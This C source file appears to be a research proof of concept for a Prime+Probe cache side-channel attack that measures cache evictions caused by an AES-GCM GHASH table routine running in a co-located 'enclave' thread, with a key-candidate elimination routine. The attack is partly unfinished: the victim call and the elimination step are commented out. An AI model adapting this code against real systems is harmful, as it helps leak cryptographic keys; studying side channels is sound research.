#define _GNU_SOURCE
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <string.h>
#include <stdio.h>
#include <errno.h>
#include <pthread.h>
#include <sys/mman.h>
#include <time.h>
#include "set_sched.h"
#include "cache.h"

#define BLOCK_SIZE 16
#define ENTRY_SIZE 4
#define KEYLEN 16
#define ROUNDS 1
#define THRESHOLD 0

// Sched. policy
#define SCHED_POLICY SCHED_RR
// Max. realtime priority
#define PRIORITY 0

/*
 * Mainthread and enclave need to be on the same 
 * phy. core but different log. core.
 * cat /proc/cpuinfo | grep 'core id'
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 * core id		: 0
 * core id		: 1
 * core id		: 2
 * core id		: 3
 */
#define CPU 0
#define ENCLAVE_CPU 4



static void usage(char**);
static void enclave_thread(void);
static int eliminate(void);
static void calcBaseKey(void);
static void calcKey(void);
static void printKey(void);
static void decryptSecret(void);

/*
 * Global variables exist for alignment reasons.
 * Must not interfer with SBox cachelines.
 */
static int alignment_dummy __attribute__ ((aligned(4096)));
static int alignment_dummy_2 __attribute__ ((aligned(1024)));
static uint32_t evict_count[TABLESIZE/CACHELINESIZE];
static unsigned int n_hits;
static size_t i, j, x, count, cand, byte, l, m, n;
static int p;
static int done_ret;

static pthread_t thread;
static pthread_mutex_t lock = PTHREAD_MUTEX_INITIALIZER;
static pid_t pid;
static volatile int flag;
static volatile int flag_out;
static volatile int done = 0;
static unsigned char candidates[16][256];
static int candidates_count[16];
static unsigned char cand_index;
static int attack_round = 0;

static uint8_t secret_key[KEYLEN];
static unsigned char in[BLOCK_SIZE];
static unsigned char out[BLOCK_SIZE];
static unsigned char enc_msg[BLOCK_SIZE];
static unsigned char *msg = "Top secret msg!";



///////////////////////////////////////////////


#if defined( _WIN32 ) || defined ( _WIN64 )
  #define __STDCALL  __stdcall
  #define __CDECL    __cdecl
  #define __INT64    __int64
  #define __UINT64    unsigned __int64
#else
  #define __STDCALL
  #define __CDECL
  #define __INT64    long long
  #define __UINT64    unsigned long long
#endif

typedef unsigned char  Ipp8u;
typedef unsigned short Ipp16u;
typedef unsigned int   Ipp32u;
typedef signed char    Ipp8s;
typedef signed short   Ipp16s;
typedef signed int     Ipp32s;
typedef float          Ipp32f;
typedef __INT64        Ipp64s;
typedef __UINT64       Ipp64u;
typedef double         Ipp64f;
typedef Ipp16s         Ipp16f;

#if defined(__INTEL_COMPILER) || (_MSC_VER >= 1300)
    #define __ALIGN8  __declspec (align(8))
    #define __ALIGN16 __declspec (align(16))
#if !defined( OSX32 )
    #define __ALIGN32 __declspec (align(32))
#else
    #define __ALIGN32 __declspec (align(16))
#endif
    #define __ALIGN64 __declspec (align(64))
#elif defined (__GNUC__)
    #define __ALIGN8  __attribute((aligned(8)))
    #define __ALIGN16 __attribute((aligned(16)))
    #define __ALIGN32 __attribute((aligned(32)))
    #define __ALIGN64 __attribute((aligned(64)))
#else
    #define __ALIGN8
    #define __ALIGN16
    #define __ALIGN32
    #define __ALIGN64
#endif

/*
// Extract byte from specified position n.
// Sure, n=0,1,2 or 3 only
*/
#define EBYTE(w,n) ((Ipp8u)((w) >> (8 * (n))))


const Ipp16u AesGcmConst_table[256] = {
0x0000, 0xc201, 0x8403, 0x4602, 0x0807, 0xca06, 0x8c04, 0x4e05, 0x100e, 0xd20f, 0x940d, 0x560c, 0x1809, 0xda08, 0x9c0a, 0x5e0b,
0x201c, 0xe21d, 0xa41f, 0x661e, 0x281b, 0xea1a, 0xac18, 0x6e19, 0x3012, 0xf213, 0xb411, 0x7610, 0x3815, 0xfa14, 0xbc16, 0x7e17,
0x4038, 0x8239, 0xc43b, 0x063a, 0x483f, 0x8a3e, 0xcc3c, 0x0e3d, 0x5036, 0x9237, 0xd435, 0x1634, 0x5831, 0x9a30, 0xdc32, 0x1e33,
0x6024, 0xa225, 0xe427, 0x2626, 0x6823, 0xaa22, 0xec20, 0x2e21, 0x702a, 0xb22b, 0xf429, 0x3628, 0x782d, 0xba2c, 0xfc2e, 0x3e2f,
0x8070, 0x4271, 0x0473, 0xc672, 0x8877, 0x4a76, 0x0c74, 0xce75, 0x907e, 0x527f, 0x147d, 0xd67c, 0x9879, 0x5a78, 0x1c7a, 0xde7b,
0xa06c, 0x626d, 0x246f, 0xe66e, 0xa86b, 0x6a6a, 0x2c68, 0xee69, 0xb062, 0x7263, 0x3461, 0xf660, 0xb865, 0x7a64, 0x3c66, 0xfe67,
0xc048, 0x0249, 0x444b, 0x864a, 0xc84f, 0x0a4e, 0x4c4c, 0x8e4d, 0xd046, 0x1247, 0x5445, 0x9644, 0xd841, 0x1a40, 0x5c42, 0x9e43,
0xe054, 0x2255, 0x6457, 0xa656, 0xe853, 0x2a52, 0x6c50, 0xae51, 0xf05a, 0x325b, 0x7459, 0xb658, 0xf85d, 0x3a5c, 0x7c5e, 0xbe5f,
0x00e1, 0xc2e0, 0x84e2, 0x46e3, 0x08e6, 0xcae7, 0x8ce5, 0x4ee4, 0x10ef, 0xd2ee, 0x94ec, 0x56ed, 0x18e8, 0xdae9, 0x9ceb, 0x5eea,
0x20fd, 0xe2fc, 0xa4fe, 0x66ff, 0x28fa, 0xeafb, 0xacf9, 0x6ef8, 0x30f3, 0xf2f2, 0xb4f0, 0x76f1, 0x38f4, 0xfaf5, 0xbcf7, 0x7ef6,
0x40d9, 0x82d8, 0xc4da, 0x06db, 0x48de, 0x8adf, 0xccdd, 0x0edc, 0x50d7, 0x92d6, 0xd4d4, 0x16d5, 0x58d0, 0x9ad1, 0xdcd3, 0x1ed2,
0x60c5, 0xa2c4, 0xe4c6, 0x26c7, 0x68c2, 0xaac3, 0xecc1, 0x2ec0, 0x70cb, 0xb2ca, 0xf4c8, 0x36c9, 0x78cc, 0xbacd, 0xfccf, 0x3ece,
0x8091, 0x4290, 0x0492, 0xc693, 0x8896, 0x4a97, 0x0c95, 0xce94, 0x909f, 0x529e, 0x149c, 0xd69d, 0x9898, 0x5a99, 0x1c9b, 0xde9a,
0xa08d, 0x628c, 0x248e, 0xe68f, 0xa88a, 0x6a8b, 0x2c89, 0xee88, 0xb083, 0x7282, 0x3480, 0xf681, 0xb884, 0x7a85, 0x3c87, 0xfe86,
0xc0a9, 0x02a8, 0x44aa, 0x86ab, 0xc8ae, 0x0aaf, 0x4cad, 0x8eac, 0xd0a7, 0x12a6, 0x54a4, 0x96a5, 0xd8a0, 0x1aa1, 0x5ca3, 0x9ea2,
0xe0b5, 0x22b4, 0x64b6, 0xa6b7, 0xe8b2, 0x2ab3, 0x6cb1, 0xaeb0, 0xf0bb, 0x32ba, 0x74b8, 0xb6b9, 0xf8bc, 0x3abd, 0x7cbf, 0xbebe
};

void XorBlock16(const void* pSrc1, const void* pSrc2, void* pDst)
{
   const Ipp8u* p1 = (const Ipp8u*)pSrc1;
   const Ipp8u* p2 = (const Ipp8u*)pSrc2;
   Ipp8u* d  = (Ipp8u*)pDst;
   int k;
   for(k=0; k<16; k++ )
      d[k] = (Ipp8u)(p1[k] ^p2[k]);
}

void XorBlock(const void* pSrc1, const void* pSrc2, void* pDst, int len)
{
   const Ipp8u* p1 = (const Ipp8u*)pSrc1;
   const Ipp8u* p2 = (const Ipp8u*)pSrc2;
   Ipp8u* d  = (Ipp8u*)pDst;
   int k;
   for(k=0; k<len; k++)
      d[k] = (Ipp8u)(p1[k] ^p2[k]);
}

void CopyBlock16(const void* pSrc, void* pDst)
{
   int k;
   for(k=0; k<16; k++ )
      ((Ipp8u*)pDst)[k] = ((Ipp8u*)pSrc)[k];
}

/*
// AesGcmMulGcm_def|safe(Ipp8u* pGhash, const Ipp8u* pHKey)
//
// Ghash = Ghash * HKey mod G()
*/
void AesGcmMulGcm_table2K(Ipp8u* pGhash, const Ipp8u* pPrecomputeData)
{
   __ALIGN16 Ipp8u t5[BLOCK_SIZE];
   __ALIGN16 Ipp8u t4[BLOCK_SIZE];
   __ALIGN16 Ipp8u t3[BLOCK_SIZE];
   __ALIGN16 Ipp8u t2[BLOCK_SIZE];

   int nw;
   Ipp32u a;

   XorBlock16(t5, t5, t5);
   XorBlock16(t4, t4, t4);
   XorBlock16(t3, t3, t3);
   XorBlock16(t2, t2, t2);

   for(nw=0; nw<4; nw++) {
      Ipp32u hashdw = ((Ipp32u*)pGhash)[nw];

      a = hashdw & 0xf0f0f0f0;
      XorBlock16(t5, pPrecomputeData+1024+EBYTE(a,1)+256*nw, t5);
      XorBlock16(t4, pPrecomputeData+1024+EBYTE(a,0)+256*nw, t4);
      XorBlock16(t3, pPrecomputeData+1024+EBYTE(a,3)+256*nw, t3);
      XorBlock16(t2, pPrecomputeData+1024+EBYTE(a,2)+256*nw, t2);

      a = (hashdw<<4) & 0xf0f0f0f0;
      XorBlock16(t5, pPrecomputeData+EBYTE(a,1)+256*nw, t5);
      XorBlock16(t4, pPrecomputeData+EBYTE(a,0)+256*nw, t4);
      XorBlock16(t3, pPrecomputeData+EBYTE(a,3)+256*nw, t3);
      XorBlock16(t2, pPrecomputeData+EBYTE(a,2)+256*nw, t2);
   }

   XorBlock(t2+1, t3, t2+1, BLOCK_SIZE-1);
   XorBlock(t5+1, t2, t5+1, BLOCK_SIZE-1);
   XorBlock(t4+1, t5, t4+1, BLOCK_SIZE-1);

   nw = t3[BLOCK_SIZE-1];
   a = (Ipp32u)AesGcmConst_table[nw];
   a <<= 8;
   nw = t2[BLOCK_SIZE-1];
   a ^= (Ipp32u)AesGcmConst_table[nw];
   a <<= 8;
   nw = t5[BLOCK_SIZE-1];
   a ^= (Ipp32u)AesGcmConst_table[nw];

   XorBlock(t4, &a, t4, sizeof(Ipp32u));
   CopyBlock16(t4, pGhash);
}

const Ipp8u cipher[960] = {0x21, 0x44,0x05, 0xe1, 0xe4, 0x2d, 0x80, 0x6e, 0x32, 0xd6, 0x83, 0x1d, 0xac, 0x1f, 0xfc, 0xf0, 0x80, 0x9e, 0x50, 0xc9, 0xa3, 0xb6, 0x53, 0x30, 0x7e, 0x53, 0xf9, 0x78, 0x81, 0x8c, 0x92, 0x8b, 0xc0, 0x7d, 0xfa, 0xfd, 0x8a, 0xaa, 0x26, 0x1d, 0x10, 0x5c, 0x7f, 0xd4, 0x93, 0x50, 0x57, 0x65, 0x79, 0x16, 0x3d, 0xac, 0x3c, 0x48, 0xb7, 0x76, 0x48, 0x95, 0x27, 0x5c, 0x6a, 0xe5, 0xca, 0x15, 0x80, 0x7d, 0xf1, 0x34, 0x91, 0x6e, 0x03, 0x27, 0xa1, 0x75, 0x7f, 0x72, 0xc6, 0xf9, 0x49, 0x11, 0x2c, 0xe4, 0x70, 0x71, 0x88, 0xa5, 0x79, 0xf6, 0xf0, 0x97, 0x4f, 0xc9, 0x51, 0x08, 0xe1, 0x2a, 0x7f, 0xc5, 0x8b, 0x7f, 0x56, 0x65, 0x36, 0x3b, 0x7b, 0xe3, 0xbc, 0x2b, 0xfd, 0xd5, 0x41, 0x35, 0x52, 0x88, 0xc0, 0x64, 0x91, 0x03, 0x8f, 0x07, 0xea, 0xfc, 0x40, 0x6c, 0x9b, 0xa5, 0x51, 0x19, 0x06, 0x0e, 0x37, 0xd0, 0x56, 0x0b, 0xaa, 0x89, 0xc0, 0x24, 0xb3, 0x9f, 0x6d, 0xa7, 0x8e, 0x65, 0x2f, 0xad, 0x02, 0xdc, 0x5d, 0xbe, 0x9f, 0xf4, 0x94, 0x84, 0x96, 0x60, 0x04, 0x73, 0xd1, 0xaf, 0xd3, 0x30, 0xaf, 0xf0, 0x90, 0xa4, 0x65, 0x66, 0x1c, 0xec, 0x40, 0x7c, 0x0b, 0xc5, 0x93, 0x7c, 0x08, 0x2c, 0xb4, 0xaa, 0xa2, 0x80, 0x6f, 0x7b, 0xfd, 0xf1, 0x30, 0xb1, 0x12, 0x3e, 0x10, 0x40, 0x9a, 0xa4, 0x28, 0xa2, 0x5e, 0x68, 0xf8, 0x8e, 0x9f, 0x27, 0xcc, 0xa9, 0x9e, 0x01, 0x44, 0x8d, 0xb6, 0xc4, 0x1d, 0x62, 0xc0, 0x26, 0x0d, 0x12, 0x28, 0x40, 0x70, 0x19, 0x8c, 0x0e, 0x3e, 0x57, 0x55, 0x0a, 0x61, 0x5e, 0xc5, 0x58, 0x8a, 0xf5, 0xe4, 0xc6, 0x81, 0x50, 0xd4, 0xe0, 0x27, 0x11, 0x55, 0x18, 0x00, 0xfa, 0x63, 0xbe, 0x36, 0x7e, 0xe0, 0xe9, 0x0b, 0x94, 0x6e, 0xc0, 0xa9, 0xa8, 0x61, 0xc5, 0x18, 0xa0, 0xed, 0x42, 0xd7, 0x13, 0x62, 0x0f, 0xc3, 0x06, 0x10, 0x3e, 0xd7, 0x82, 0x1b, 0x80, 0xe9, 0xd8, 0xde, 0xb1, 0xf3, 0xb0, 0xc8, 0xa1, 0xe3, 0x50, 0x5f, 0xd6, 0x61, 0x97, 0x2c, 0xc9, 0x9e, 0x52, 0x07, 0xb5, 0x67, 0x98, 0x6e, 0xc0, 0x2e, 0x3a, 0xdf, 0x42, 0xd8, 0xe8, 0x02, 0x43, 0xe0, 0x72, 0x95, 0xb5, 0xfd, 0x5e, 0x52, 0x0f, 0xf5, 0xbf, 0x27, 0x8b, 0x6b, 0x13, 0x9d, 0x9b, 0xd7, 0x9a, 0x42, 0x7b, 0x57, 0x78, 0xdd, 0x37, 0x3b, 0xbd, 0xae, 0x0f, 0x84, 0x51, 0x74, 0x65, 0x2f, 0x08, 0x80, 0xa1, 0x4c, 0x94, 0xbf, 0x64, 0x55, 0x89, 0x7e, 0xa7, 0x9f, 0xd0, 0xea, 0xb4, 0xba, 0xe5, 0x37, 0x17, 0xbd, 0xa9, 0xce, 0x7b, 0x52, 0xea, 0x89, 0x73, 0x9c, 0x50, 0x1d, 0xde, 0x11, 0xf9, 0x4a, 0x67, 0xe8, 0x99, 0x01, 0x33, 0x0f, 0xf1, 0xa1, 0xe2, 0xb9, 0xe7, 0x6f, 0xec, 0x31, 0x5d, 0x3c, 0xfe, 0x03, 0x38, 0x67, 0xa0, 0x96, 0xbc, 0x6c, 0x40, 0xfc, 0x90, 0x44, 0xf1, 0xba, 0xc2, 0x9e, 0x0b, 0x62, 0xb6, 0x69, 0x5d, 0xf5, 0x3a, 0xf9, 0x47, 0xa2, 0x4e, 0x19, 0x7d, 0x02, 0xc7, 0x12, 0x83, 0xff, 0x6f, 0xd0, 0xad, 0xbb, 0xf7, 0xb8, 0xd4, 0xa3, 0x2a, 0x08, 0xdf, 0xce, 0xdc, 0x2d, 0xdd, 0x15, 0x80, 0xf4, 0x9a, 0x7e, 0x4c, 0x48, 0x9b, 0x93, 0x87, 0xd0, 0x7e, 0x4d, 0x78, 0x63, 0x06, 0xfe, 0x7a, 0x02, 0x8b, 0xdf, 0x8c, 0x8a, 0xad, 0x9d, 0xbd, 0xff, 0x8e, 0xbe, 0xd5, 0x59, 0xdc, 0x6f, 0x14, 0x80, 0x87, 0x76, 0x49, 0xbc, 0x11, 0x56, 0x1d, 0x87, 0xc3, 0x34, 0xa7, 0xde, 0xff, 0xee, 0xed, 0x1d, 0x1a, 0x29, 0x98, 0xa0, 0x9e, 0x5c, 0x43, 0x24, 0x77, 0x49, 0xb6, 0x1b, 0x94, 0x19, 0xef, 0x33, 0xf6, 0xe7, 0x26, 0xcd, 0x59, 0xbc, 0x2c, 0xf8, 0x19, 0xf4, 0x7e, 0x87, 0x8a, 0x26, 0xc9, 0x5b, 0x99, 0x24, 0x2d, 0x04, 0xd9, 0xc1, 0xb7, 0x3f, 0xf5, 0xca, 0xeb, 0xad, 0x2d, 0xdc, 0xa1, 0x3f, 0x23, 0x48, 0xff, 0x65, 0x65, 0xa8, 0x9a, 0x6c, 0x44, 0xde, 0x8d, 0x60, 0x9d, 0xd2, 0x1b, 0x24, 0xc8, 0xa3, 0xe3, 0x86, 0x39, 0x2f, 0x0a, 0x49, 0xcc, 0x01, 0xc5, 0x94, 0xc8, 0xc6, 0xc9, 0x6e, 0xa3, 0xbf, 0x7e, 0x2a, 0xab, 0x1f, 0xc0, 0x76, 0x5f, 0xd2, 0x23, 0x5b, 0xbd, 0x09, 0xff, 0x06, 0x92, 0xa0, 0x28, 0x40, 0x02, 0x90, 0xe3, 0x54, 0x57, 0xfe, 0x30, 0xa9, 0x05, 0x0c, 0x2c, 0x27, 0x57, 0x70, 0x5d, 0x90, 0xe9, 0x1b, 0xec, 0x8b, 0x53, 0x19, 0xaf, 0x33, 0x7d, 0xe9, 0xcb, 0x3d, 0x39, 0xf3, 0x8d, 0x26, 0x99, 0xec, 0xfd, 0xba, 0x01, 0xf7, 0x28, 0xb2, 0x91, 0xac, 0xe8, 0x34, 0x01, 0x07, 0xb9, 0x48, 0x61, 0x7a, 0x92, 0x57, 0xab, 0x3c, 0x1b, 0x0a, 0xaf, 0x3c, 0x61, 0x8d, 0x91, 0x56, 0xc3, 0x2d, 0x44, 0x80, 0x01, 0xe5, 0x5f, 0x6b, 0x62, 0x32, 0xc4, 0x58, 0x78, 0xdb, 0x47, 0x6c, 0xb5, 0x40, 0xf5, 0x33, 0x9f, 0x34, 0x7a, 0x21, 0x98, 0x9e, 0x51, 0xa5, 0x24, 0xa2, 0xb5, 0x6c, 0xf5, 0x48, 0xbc, 0xba, 0x67, 0x3e, 0xf8, 0xc5, 0x72, 0x33, 0x96, 0xb9, 0xd6, 0x5f, 0xfd, 0xaf, 0xdd, 0x76, 0xa5, 0x82, 0xef, 0xc6, 0xfa, 0xf8, 0x3c, 0x7f, 0xce, 0x3f, 0xc0, 0xf2, 0x26, 0x39, 0x35, 0xc4, 0xf9, 0x0e, 0xab, 0xaf, 0x8b, 0x3c, 0xad, 0x56, 0xd2, 0xdf, 0x32, 0x3d, 0xda, 0x6a, 0xb3, 0x6d, 0x8e, 0x0d, 0x56, 0x4c, 0x89, 0x57, 0x81, 0x86, 0xc6, 0x68, 0x59, 0xe6, 0x44, 0x0f, 0xb7, 0xd9, 0x63, 0xe6, 0xda, 0xd3, 0x62, 0x0d, 0x4c, 0x9b, 0xd7, 0x7d, 0xb5, 0xf3, 0xed, 0x02, 0x9c, 0xc0, 0xae, 0x2f, 0x8f, 0xda, 0x39, 0xcc, 0x4d, 0x38, 0xa3, 0x6d, 0x25, 0x86, 0x22, 0xf6, 0xd7, 0xcd, 0x3b, 0x58, 0x89, 0xa0, 0x43, 0x00, 0xb0, 0xb0, 0x67, 0xc4, 0x79, 0xe4, 0x70, 0xbf, 0x0c, 0xb0, 0xfe, 0xec, 0x23, 0xcc, 0x4e, 0x94, 0xb3, 0x08, 0x23, 0x33, 0x9b, 0x1e, 0x05, 0xc3, 0x0b, 0x99, 0x69, 0x4c, 0xd0, 0x7c, 0xd8, 0xba, 0xc7, 0xb0, 0x37, 0x15, 0xc0, 0xed, 0x5b, 0x2e, 0xc2, 0x13, 0xf4, 0xaf, 0x55, 0x85, 0x22, 0x63, 0x99, 0x58, 0x95, 0xc8, 0x48, 0x95, 0xa5, 0x60, 0xd7, 0x4f, 0x14, 0xa1, 0x8e, 0x57, 0xc5, 0x71, 0x60, 0xe9, 0xb0, 0x1c, 0xf0, 0x2e, 0xdd, 0x25, 0xc8, 0x90, 0x37, 0x7e, 0x67, 0x4c, 0xad, 0x8d, 0x76, 0xb4, 0xae, 0x07, 0x76, 0x51, 0x89, 0x27, 0xbb, 0x0f, 0x2c, 0x4c, 0x9d, 0x32, 0xa3, 0x9b, 0xd1, 0xd1, 0x3c, 0xbb, 0x00, 0x3f, 0x88, 0xdd, 0x78, 0x1a, 0x47, 0x97, 0x18, 0x87, 0xd6, 0x40, 0xf0, 0xe2, 0xca, 0xa6, 0xf4, 0x19, 0x26, 0xd2, 0x65, 0xd7, 0x91, 0x97, 0xcc, 0xdd, 0x87, 0xd6, 0x77, 0xb8, 0xdb, 0xd7, 0x89, 0x61, 0x15, 0xab, 0xff, 0x21, 0x10, 0x03, 0x2c, 0x74, 0x7b, 0x10, 0xad, 0x88, 0xb8, 0x87, 0x7f, 0x86, 0x90, 0x44, 0x81, 0xcb, 0xd1, 0xd1, 0x60, 0x7b, 0x40, 0x77, 0xbf, 0x5a, 0x25, 0x90, 0x8a, 0xc0, 0xb4, 0x52, 0x4d, 0x60, 0x80, 0x71, 0xa8};

Ipp8u pHash[16];

const Ipp8u pHKey[2*1024]; 

unsigned int auth() {
	unsigned int a = 0;

	int len = 960;
	Ipp8u* pSrc = (Ipp8u*)malloc(len);

	memset(pHash, 0, 16);
	memcpy(pSrc, cipher, 960);

	while(len>=BLOCK_SIZE) {
      /* add src */
      XorBlock16(pSrc, pHash, pHash);
      /* hash it */
      AesGcmMulGcm_table2K(pHash, pHKey);

      pSrc += BLOCK_SIZE;
      len -= BLOCK_SIZE;
   	}

	// free(pSrc);
	return a;
}

Ipp8u* pSrc;

unsigned int compute() {
	//memcpy(pSrc, pSrc, 64);
}

///////////////////////////////////////////////






/*
 * Print usage.
 */
void usage(char **argv) {
	printf("Usage: %s\n", argv[0]);
}

/*
 * Pthread-function for running the enclave.
 */
static void enclave_thread(void) {

	pthread_mutex_lock(&lock);

	// set cpu for enclave thread
	cpu_set_t set;
	CPU_ZERO(&set);
	CPU_SET(ENCLAVE_CPU, &set);
	errno = pthread_setaffinity_np(thread, sizeof(cpu_set_t), &set);
	if(errno != 0) {
		exit(EXIT_FAILURE);
	}

	fprintf(stderr, "[Enclave] Enclave running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);

	// TODO CUSTEM CODE
	for(;;);// compute();
}

/*
 * Elimination Method for finding the correct key cleanUp.
 * Source: https://dl.acm.org/citation.cfm?id=1756531
 */
static int eliminate(void) {
	done_ret = 0;
	// take every cache that wasn't evicted
	for(count = 0; count < BLOCK_SIZE; count++) {
		if (evict_count[count] > THRESHOLD) {
			continue;
		}
		done_ret = 1;
		// remove resulting keybytes from candidates list
		for(cand = 0; cand < BLOCK_SIZE; cand++) {
			for(byte = 0; byte < BLOCK_SIZE; byte++) {
				cand_index = out[cand] ^ (Te4_0[((CACHELINESIZE/ENTRY_SIZE)*count)+byte] >> 24);
				if (candidates[cand][cand_index] != 0x00) {
					// eliminate bytes from key candidates, only most significant byte of entry is needed
					candidates[cand][cand_index] = 0x00;
					// reduce number of candidates for keybyte
					candidates_count[cand] -= 1;
				}
				// if every keybyte has one candidate left, we're finished
				if (candidates_count[cand] > 1) {
					done_ret = 0;
				}
			} 
		}
	}	
	return done_ret;
}


/*
 * Start enclave in seperated pthread, perform measurement in main thread.
 */
int main(int argc,char **argv) {
	// align stack, so it doesn't interfer with the measurement
	volatile int alignment_stack __attribute__ ((aligned(4096)));
	volatile int alignment_stack_2 __attribute__ ((aligned(1024)));

	pSrc = (Ipp8u*)malloc(960);

	if (argc != 1) {
		usage(argv);
		return EXIT_FAILURE;
	}
	
	// fill candidates
	for(j=0; j < BLOCK_SIZE; j++) {
		candidates_count[j] = 256;
		for(i=0; i<BLOCK_SIZE*BLOCK_SIZE; i++) {
			candidates[j][i] = 1;
		}
	}	


	//pin to cpu 
	if ((pin_cpu(CPU)) == -1) {
		fprintf(stderr, "[Attacker] Couln't pin to CPU: %d\n", CPU);
		return EXIT_FAILURE;
	}

	// set sched_priority
	if ((set_real_time_sched_priority(SCHED_POLICY, PRIORITY)) == -1) {
		fprintf(stderr, "[Attacker] Couln't set scheduling priority\n");
		return EXIT_FAILURE;
	}

	// Start enclave thread
	fprintf(stderr, "[Attacker] Creating thread\n");
	errno = pthread_create(&thread, NULL, (void* (*) (void*)) enclave_thread, NULL);	
	if (errno != 0) {
		return EXIT_FAILURE;
	}	

	// initalize random generator
	srand(time(NULL));

	pthread_mutex_lock(&lock);
	fprintf(stderr, "[Attacker] Attacker running on %d\n", sched_getcpu());
	pthread_mutex_unlock(&lock);

	int repeat = 10000;

	for (;repeat > 0; repeat--) {
		
		memset(evict_count, 0x0, (TABLESIZE/CACHELINESIZE)*4);
		for (i = 0; i < TABLESIZE/CACHELINESIZE; i++) {
			// fill cache
			prime();

			// compute();

			// probe cache
			evict_count[i] = probe(i);
		}	

		for(i = 0; i < (TABLESIZE/CACHELINESIZE); i++) {
			for (l = 0; l < 8; l++) {
				p = evict_count[i] & 0x0f;
				evict_count[i] >>= 4;
				fprintf(stderr, "%d-", p);
			}
			fprintf(stderr, "\n");
		}
		fprintf(stderr, "\n");

		/*
		if (eliminate() == 1) {
			fprintf(stderr, "[Attacker] Found!\n");
		}
		*/

	}
	fprintf(stderr, "[Attacker] Stopping enclave\n");
	// pthread_join(thread, NULL);
	return EXIT_SUCCESS;
}

